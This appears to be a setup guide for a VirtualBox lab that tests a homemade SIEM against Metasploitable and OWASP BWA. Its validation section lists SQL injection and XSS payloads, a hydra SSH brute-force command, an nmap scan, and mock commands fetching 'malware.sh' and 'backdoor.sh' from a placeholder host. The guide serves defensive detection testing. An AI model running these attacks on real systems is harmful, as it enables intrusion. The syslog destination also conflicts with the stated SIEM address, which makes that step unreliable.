# VirtualBox SIEM Lab Setup

## Objective

Create a test lab in Oracle VirtualBox using the following virtual machines:
- Metasploitable
- OWASP Broken Web Applications (OWASP BWA)
- Linux Mint (SIEM host)
- Ubuntu Server

The lab will place all VMs on the same isolated network so your SIEM project can observe attacks, receive syslog data, and verify whether it detects malicious activity.

This guide is written for a Linux Mint VM running your SIEM project from `/opt/lampp/htdocs/SIEMproject`.

---

## 1. Lab Topology and Network Design

### Recommended network design

Use a VirtualBox **Host-Only Network** for the SIEM lab.

- Host-only adapter: connects the host and all lab VMs on the same subnet.
- Optional NAT adapter: allows VMs to access the internet for package updates.

### Example addressing scheme

Use a network like `192.168.56.0/24`.

- Physical host (VirtualBox host-only adapter): `192.168.56.1`
- Metasploitable: `192.168.56.10`
- OWASP BWA: `192.168.56.20`
- Linux Mint (SIEM host): `192.168.56.30`
- Ubuntu Server: `192.168.56.40`

> Note: If you use a different host-only network adapter, adjust the addresses accordingly.

### VirtualBox adapter setup

For every VM, configure two network adapters if you want both isolation and internet access.

1. Adapter 1: `NAT` (optional, internet access)
2. Adapter 2: `Host-only Adapter` using `vboxnet0`

For the SIEM host machine, the host-only adapter is already available from VirtualBox. No VM is required for the host.

---

## 2. VirtualBox Environment Preparation

### Install VirtualBox

Install Oracle VirtualBox on your host, then create or enable the host-only network.

#### Linux example

```bash
sudo apt update
sudo apt install virtualbox virtualbox-ext-pack
```

### Enable host-only network

In VirtualBox:

1. Open `File > Host Network Manager`
2. Create `vboxnet0` if needed
3. Set IPv4 address to `192.168.56.1`
4. Set mask to `255.255.255.0`
5. Disable the built-in DHCP server if you want to use static addresses

If you want DHCP, enable it and use a range such as `192.168.56.100` to `192.168.56.200`.

---

## 3. Download and Import the VMs

### Metasploitable

1. Download `Metasploitable2` OVA from the official Rapid7 archive.
2. Import into VirtualBox: `File > Import Appliance`
3. Accept defaults, then open the VM settings.
4. Set `Adapter 1` to `NAT`, `Adapter 2` to `Host-only Adapter (vboxnet0)`.

### OWASP Broken Web Apps (BWA)

1. Download the OWASP Broken Web Applications OVA image.
2. Import it into VirtualBox.
3. Configure networking the same way: NAT + Host-only.

### Linux Mint

1. Download Linux Mint ISO.
2. Create a new VM in VirtualBox.
   - Type: Linux
   - Version: Ubuntu (64-bit)
   - Memory: 2 GB or more
   - Virtual disk: 20 GB or more
3. Attach the Mint ISO under `Settings > Storage`.
4. Set network adapters: NAT + Host-only.
5. Install Linux Mint normally.

### Ubuntu Server

1. Download Ubuntu Server ISO.
2. Create a VM.
   - Type: Linux
   - Version: Ubuntu (64-bit)
   - Memory: 1.5 GB or more
   - Virtual disk: 10 GB or more
3. Attach the ISO and install.
4. Set network adapters: NAT + Host-only.

---

## 4. Configure Host-Only Networking on Each VM

The goal is to make all lab VMs reachable from your SIEM host on the same subnet.

### 4.1 Metasploitable network config

1. Start the VM.
2. Log in with default credentials:
   - Username: `msfadmin`
   - Password: `msfadmin`
3. Edit the interface configuration:

```bash
sudo nano /etc/network/interfaces
```

4. Set the host-only interface:

```text
auto eth1
iface eth1 inet static
    address 192.168.56.10
    netmask 255.255.255.0
    gateway 192.168.56.1
```

5. Restart networking:

```bash
sudo ifdown eth1 && sudo ifup eth1
```

6. Confirm the IP:

```bash
ip addr show eth1
ping -c 3 192.168.56.1
```

### 4.2 OWASP BWA network config

In most OWASP BWA images, the interface is configured via `/etc/network/interfaces`.

```bash
sudo nano /etc/network/interfaces
```

Add or update:

```text
auto eth1
iface eth1 inet static
    address 192.168.56.20
    netmask 255.255.255.0
    gateway 192.168.56.1
```

Restart networking and verify.

### 4.3 Linux Mint network config

Linux Mint uses NetworkManager, but you can also use a static config in the GUI.

#### GUI method

1. Open `Network Settings`.
2. Choose the host-only interface.
3. Set IPv4 to `Manual`.
4. Use:
   - Address: `192.168.56.30`
   - Netmask: `255.255.255.0`
   - Gateway: `192.168.56.1`
5. Save and reconnect.

#### Terminal method

Linux Mint 20+ may use `netplan` or NetworkManager. For netplan:

```bash
sudo nano /etc/netplan/01-netcfg.yaml
```

Example:

```yaml
network:
  version: 2
  ethernets:
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.56.30/24
      gateway4: 192.168.56.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
```

Apply:

```bash
sudo netplan apply
```

### 4.4 Ubuntu Server network config

Ubuntu Server uses netplan.

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

Example config:

```yaml
network:
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: no
      addresses:
        - 192.168.56.40/24
      gateway4: 192.168.56.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
  version: 2
```

Apply config:

```bash
sudo netplan apply
```

### 4.5 Host verification

From your host machine, verify all VMs are reachable:

```bash
ping -c 2 192.168.56.10
ping -c 2 192.168.56.20
ping -c 2 192.168.56.30
ping -c 2 192.168.56.40
```

---

## 5. Configure Your SIEM Mint VM for the Lab

### 5.1 Confirm host-only interface

On the Mint VM, confirm the host-only adapter exists and is active:

```bash
ip addr show enp0s8
```

If it is not up, make sure the VM has the `Host-only Adapter (vboxnet0)` enabled in VirtualBox.

### 5.2 Set SIEM to listen on the Mint VM host-only network

Your SIEM app will run inside the Linux Mint VM at `192.168.56.30`.

If you want to access the SIEM UI from the physical host or other lab VMs, use `http://192.168.56.30/SIEMproject/`.

### 5.3 Configure your SIEM project's API and syslog destinations

In `pythonSIEMscript.py`, verify:

```python
PHP_API_ENABLED = True
PHP_API_URL = "http://localhost/SIEMproject/api.php/security-events"
```

In `app/config/config.php`, verify the data file paths and the URL settings point to your project.

### 5.4 Ensure JSON files are writable

```bash
cd /opt/lampp/htdocs/SIEMproject
sudo chown -R www-data:www-data .
chmod 666 *.json
mkdir -p captured_logs archives
```

---

## 6. Configure Syslog Forwarding from the VMs

A strong way to make your SIEM observe activity is to forward syslog messages from each VM to the SIEM host.

### 6.1 Use port 514 or a non-privileged port

- Standard syslog port: UDP `514`
- If your SIEM listener runs without root, use a non-privileged port like `10514`

If your PHP listener uses `514`, run it with sudo.

### 6.2 Configure rsyslog on Linux VMs

On Ubuntu Server, Linux Mint, Metasploitable, and OWASP BWA (Linux-based), install and configure rsyslog.

#### Ubuntu / Mint / OWASP BWA

```bash
sudo apt update
sudo apt install rsyslog
```

Create send rule:

```bash
sudo tee /etc/rsyslog.d/50-siem.conf <<'EOF'
*.* @192.168.56.1:514
EOF
```

Restart rsyslog:

```bash
sudo systemctl restart rsyslog
```

#### Metasploitable

Metasploitable includes syslog support by default. Add the same forwarding rule to `/etc/rsyslog.conf` or `/etc/rsyslog.d/50-siem.conf`.

### 6.3 Verify syslog forwarding

From each VM:

```bash
logger "SIEM lab test message from $(hostname)"
```

On the host, check if the message arrives in the SIEM syslog endpoint or in `captured_logs/syslog_received.json` after the listener runs.

---

## 7. Start the SIEM Services

### 7.1 Start Apache / PHP

If you are using LAMPP:

```bash
sudo /opt/lampp/lampp start
```

Verify your SIEM web UI:

```bash
curl http://localhost/SIEMproject/
```

### 7.2 Start the syslog listener

From your SIEM project folder:

```bash
cd /opt/lampp/htdocs/SIEMproject
sudo php app/services/SyslogListener.php
```

If the listener uses port `10514`, adapt the VM syslog forwarding rule accordingly.

### 7.3 Start the Python SIEM script

```bash
cd /opt/lampp/htdocs/SIEMproject
python3 pythonSIEMscript.py
```

Leave it running so it can parse logs, detect events, and push detections to the PHP API.

---

## 8. Attack Scenarios for Validation

### 8.1 Web application attacks against OWASP BWA

Use OWASP BWA as your target application environment.

#### SQL injection

1. Open the OWASP BWA web interface in a browser on Mint or the host.
2. Choose a vulnerable page such as DVWA or Mutillidae.
3. Submit an attack payload like:

```text
' OR '1'='1
```

4. Observe the SIEM dashboard for detection of SQL injection or suspicious HTTP requests.

#### Cross-site scripting (XSS)

1. Use an injection field on DVWA/Mutillidae.
2. Enter a payload such as:

```html
<script>alert('xss')</script>
```

3. Confirm the SIEM logs or event stream record an XSS-like pattern.

### 8.2 Brute force and authentication attacks

#### SSH brute force from Linux Mint

From Linux Mint:

```bash
sudo apt install hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ssh
```

This creates repeated login failures and should generate syslog messages or suspicious event activity.

#### Web login brute force

Attack a login page on OWASP BWA with repeated invalid credentials.

### 8.3 Network scanning

Use Nmap from the Mint or Ubuntu Server VM:

```bash
sudo apt install nmap
nmap -sS -p 1-1000 192.168.56.10 192.168.56.20 192.168.56.40
```

The SIEM should detect scanning behavior or suspicious connection attempts.

### 8.4 Malicious command execution patterns

On a target VM such as Metasploitable, run commands that resemble malware behavior:

```bash
wget http://example.com/malware.sh
curl -O http://example.com/backdoor.sh
rm -rf /tmp/*.sh
```

Your detection engine should flag suspicious CLI patterns if it is designed for those signatures.

### 8.5 Privilege escalation and authentication failures

Generate sudo failures and login failures on Ubuntu Server and Mint:

```bash
sudo false
sudo ls /root
su invaliduser
```

Those events should appear as syslog anomalies and may produce SIEM findings.

---

## 9. Verify SIEM Detection

### 9.1 Use the web dashboard

Open the SIEM web interface from the physical host or another VM:

```text
http://192.168.56.30/SIEMproject/
```

If you are browsing from inside the Mint VM itself, you may use `http://localhost/SIEMproject/`.

Look for:
- Real-time event stream
- Severity counts
- Attack descriptions
- Source IPs from your lab VMs

### 9.2 Use API endpoints

Query the raw event data:

```bash
curl http://localhost/SIEMproject/api.php/events
curl http://localhost/SIEMproject/api.php/syslog-entries
```

### 9.3 Confirm syslog ingestion

Check the log store and captured data:

```bash
ls -l /opt/lampp/htdocs/SIEMproject/captured_logs
cat /opt/lampp/htdocs/SIEMproject/captured_logs/syslog_received.json | jq . | head
```

### 9.4 Review detection files

Inspect the JSON event file:

```bash
cat /opt/lampp/htdocs/SIEMproject/log_data.json | jq . | less
```

Look for entries that match attacks launched from `192.168.56.10`, `192.168.56.20`, `192.168.56.30`, or `192.168.56.40`.

---

## 10. Advanced Lab Enhancements

### 10.1 Add a separate attacker VM

You can add another small Linux VM to act as a dedicated attacker host.

### 10.2 Use internal-only network instead of host-only

Use an `Internal Network` adapter if you want a fully isolated lab separate from your host.

### 10.3 Use a dedicated syslog VM

A dedicated logging VM can send all forwarded syslog to your SIEM host from one central source.

### 10.4 Configure firewall rules

On each VM, allow only the host-only subnet to connect to services.

Example:

```bash
sudo ufw allow from 192.168.56.0/24 to any port 22 proto tcp
sudo ufw allow from 192.168.56.0/24 to any port 80 proto tcp
```

---

## 11. Troubleshooting

### Problem: VMs cannot ping the host

- Verify each VM has `Host-only Adapter` enabled.
- Confirm the host-only adapter IP with `ip addr show vboxnet0`.
- Make sure the VM IP address is on the same `192.168.56.0/24` subnet.

### Problem: SIEM does not receive syslog data

- Confirm the syslog listener is running.
- Confirm each VM’s rsyslog rule points to `192.168.56.1:514`.
- If the listener is on a non-root port such as `10514`, update the forwarding rule.

### Problem: SIEM dashboard returns no events

- Make sure `pythonSIEMscript.py` is running.
- Confirm the PHP API endpoint works: `curl http://localhost/SIEMproject/api.php/events`
- Check file permissions on `*.json`.

### Problem: OWASP BWA or Metasploitable web pages are unavailable

- Confirm the VM IP and host-only interface.
- Access the service from the host browser using `http://192.168.56.20/` or `http://192.168.56.10/`.

---

## 12. Suggested Attack Validation Plan

1. Start the SIEM stack and syslog listener.
2. Confirm lab VMs can ping each other and the host.
3. Send one benign syslog message from each VM.
4. Run a web attack against OWASP BWA.
5. Perform a port scan from Mint or Ubuntu Server.
6. Generate brute-force SSH failures against Metasploitable.
7. Confirm events appear in the SIEM dashboard and API.
8. Review `log_data.json` and `raw_logs.json` for corresponding records.

---

## 13. Summary

This document builds a complete VirtualBox lab for testing your SIEM project. The key elements are:
- consistent host-only networking for all lab VMs
- explicit static IP assignments for reliable detection
- syslog forwarding from each VM to the SIEM host
- attack scenarios against OWASP BWA, Metasploitable, and server targets
- verification using your SIEM dashboard, API, and JSON output

Use this lab to prove whether your SIEM can detect attacks on both application-level and system/network-level activity.
